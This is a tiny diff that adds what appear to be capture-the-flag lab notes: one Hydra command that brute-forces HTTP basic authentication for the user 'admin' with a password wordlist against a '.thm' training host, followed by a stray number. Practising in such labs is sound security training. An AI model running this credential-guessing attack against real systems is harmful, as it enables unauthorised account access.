@@ -1,0 +1,3 @@
+hydra -I -V -l admin -P /Downloads/pass.txt "http-get://enum.thm/labs/basic_auth:A=BASIC"
+
+ 23869045
